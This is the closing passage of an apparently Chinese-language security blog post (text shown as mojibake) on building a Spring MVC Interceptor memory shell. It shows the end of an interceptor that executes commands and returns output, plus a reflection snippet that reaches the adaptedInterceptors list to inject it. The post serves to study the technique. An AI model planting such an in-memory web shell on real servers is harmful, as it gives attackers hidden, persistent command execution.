</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">br</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">isr</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">(</span><span class="n">IOException</span><span class="w"> </span><span class="n">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">response</span><span class="p">.</span><span class="na">setContentType</span><span class="p">(</span><span class="s">&#34;text/plain&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">PrintWriter</span><span class="w"> </span><span class="n">writer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">response</span><span class="p">.</span><span class="na">getWriter</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">writer</span><span class="p">.</span><span class="na">write</span><span class="p">(</span><span class="s">&#34;æ‰§è¡Œå‘½ä»¤æ—¶å‡ºç°å¼‚å¸¸: &#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">e</span><span class="p">.</span><span class="na">getMessage</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="n">writer</span><span class="p">.</span><span class="na">close</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">            </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;preprepreprepreprepre&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">// è¿™é‡Œå¯ä»¥è¿›è¡Œæƒé™éªŒè¯ç­‰æ“ä½œï¼Œå¦‚æœéªŒè¯ä¸é€šè¿‡å¯ä»¥è¿”å› false ä¸­æ–­è¯·æ±‚å¤„ç†</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">//    public Interceptor_demo(String a) {</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">//    }</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">postHandle</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">handler</span><span class="p">,</span><span class="w"> </span><span class="nd">@Nullable</span><span class="w"> </span><span class="n">ModelAndView</span><span class="w"> </span><span class="n">mv</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;postpostpostpostpost&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">afterCompletion</span><span class="p">(</span><span class="n">HttpServletRequest</span><span class="w"> </span><span class="n">request</span><span class="p">,</span><span class="w"> </span><span class="n">HttpServletResponse</span><span class="w"> </span><span class="n">response</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">handler</span><span class="p">,</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="n">ex</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">IOException</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;afterafterafterafter&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></div><h2 id="0x04-æ€»ç»“-1">0x04 æ€»ç»“<a hidden class="anchor" aria-hidden="true" href="#0x04-æ€»ç»“-1">#</a></h2>
<p>ä¸‹é¢è¿™ä¸ªè°ƒç”¨é¡ºåºçš„åŸå› ï¼Œha.handleæ˜¯controller</p>
<p><img loading="lazy" src="images/image-20241125175603240.png" alt="image-20241125175603240"  />
</p>
<p>Interceptorå†…å­˜é©¬ç›¸å¯¹è€Œè¨€ç®€å•å¾ˆå¤šï¼Œæˆ‘æ²¡èŠ±å¤šå°‘æ—¶é—´å°±æå‡ºæ¥äº†ï¼Œä½†æ˜¯æ–‡ç« å’Œä¸€äº›æ€è€ƒæœ‰å†™äº†å¥½ä¹…hhh</p>
<p>ä½†æ˜¯æœ‰ä¸ªåœ°æ–¹æˆ‘è¦åäº†ï¼Œç½‘ä¸Šçš„poc</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">org</span><span class="p">.</span><span class="na">springframework</span><span class="p">.</span><span class="na">web</span><span class="p">.</span><span class="na">servlet</span><span class="p">.</span><span class="na">handler</span><span class="p">.</span><span class="na">AbstractHandlerMapping</span><span class="w"> </span><span class="n">abstractHandlerMapping</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">org</span><span class="p">.</span><span class="na">springframework</span><span class="p">.</span><span class="na">web</span><span class="p">.</span><span class="na">servlet</span><span class="p">.</span><span class="na">handler</span><span class="p">.</span><span class="na">AbstractHandlerMapping</span><span class="p">)</span><span class="n">context</span><span class="p">.</span><span class="na">getBean</span><span class="p">(</span><span class="s">&#34;requestMappingHandlerMapping&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">java</span><span class="p">.</span><span class="na">lang</span><span class="p">.</span><span class="na">reflect</span><span class="p">.</span><span class="na">Field</span><span class="w"> </span><span class="n">field</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">org</span><span class="p">.</span><span class="na">springframework</span><span class="p">.</span><span class="na">web</span><span class="p">.</span><span class="na">servlet</span><span class="p">.</span><span class="na">handler</span><span class="p">.</span><span class="na">AbstractHandlerMapping</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&#34;adaptedInterceptors&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">field</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">ArrayList</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">adaptedInterceptors</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">util</span><span class="p">.</span><span class="na">ArrayList</span><span class="o">&lt;</span><span class="n">Object</span><span class="o">&gt;</span><span class="p">)</span><span class="n">field</span><span class="p">.</span><span class="na">get</span><span class="p">(</span><span class="n">abstractHandlerMapping</span><span class="p">);</span><span class="w">
</span></span></span></code></pre></div><p><code>requestMappingHandlerMapping</code>æœ‰<code>adaptedInterceptors</code>è¿™ä¸ªå€¼ï¼Œæˆ‘å½“æ—¶çœŸæ²¡çœ‹åˆ°åäº†ï¼Œè¿˜æœ‰æ„Ÿè§‰ä¹Ÿæ˜¯pocæ„é€ çš„æœ‰ç‚¹æ­»æ¿äº†</p>
<p>åé¢çœ‹äº†ä¸‹æ˜¯æœ‰è¿™ä¸ªå€¼çš„wwwwï¼Œä¸‹é¢å€’æ•°ç¬¬äºŒä¸ªå°±æ˜¯</p>
<p><img loading="lazy" src="images/image-20241125191209534.png" alt="image-20241125191209534"  />
</p>
<p><strong>å‚è€ƒï¼š</strong></p>
<blockquote>
<p><a href="https://xz.aliyun.com/t/12047?time__1311=GqGxR70QD%3DG%3DitD%2FYriQGkbcHPWuff%2B7ubD#toc-11">https://xz.aliyun.com/t/12047?time__1311=GqGxR70QD%3DG%3DitD%2FYriQGkbcHPWuff%2B7ubD#toc-11</a></p>
<p><a href="https://jlkl.github.io/2022/05/26/Java-09/">https://jlkl.github.io/2022/05/26/Java-09/</a></p>
</blockquote>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://Jiecub3.github.io/zh/posts/java/chain/commonsbeanutilsshiro550/">
    <span class="title">Â« ä¸Šä¸€é¡µ</span>
    <br>
    <span>CommonsBeanutils&amp;shiro550</span>
  </a>
  <a class="next" href="https://Jiecub3.github.io/zh/posts/java/chain/jackson%E5%8E%9F%E7%94%9F%E9%93%BE/">
    <span class="title">ä¸‹ä¸€é¡µ Â»</span>
    <br>
    <span>jacksonåŸç”Ÿé“¾</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
        <span>&copy; 2025 <a href="https://Jiecub3.github.io/zh/">Jiecub3</a></span> Â· 

    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
<script>
    document.querySelectorAll('pre > code').forEach((codeblock) => {
        const container = codeblock.parentNode.parentNode;

        const copybutton = document.createElement('button');
        copybutton.classList.add('copy-code');
        copybutton.innerHTML = 'å¤åˆ¶';

        function copyingDone() {
            copybutton.innerHTML = 'å·²å¤åˆ¶ï¼';
            setTimeout(() => {
                copybutton.innerHTML = 'å¤åˆ¶';
            }, 2000);
        }

        copybutton.addEventListener('click', (cb) => {
            if ('clipboard' in navigator) {
                navigator.clipboard.writeText(codeblock.textContent);
                copyingDone();
                return;
            }

            const range = document.createRange();
            range.selectNodeContents(codeblock);
            const selection = window.getSelection();
            selection.removeAllRanges();
            selection.addRange(range);
            try {
                document.execCommand('copy');
                copyingDone();
            } catch (e) { };
            selection.removeRange(range);
        });

        if (container.classList.contains("highlight")) {
            container.appendChild(copybutton);
        } else if (container.parentNode.firstChild == container) {
            
        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
            
            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
        } else {
            
            codeblock.parentNode.appendChild(copybutton);
        }
    });
</script>
</body>

</html>
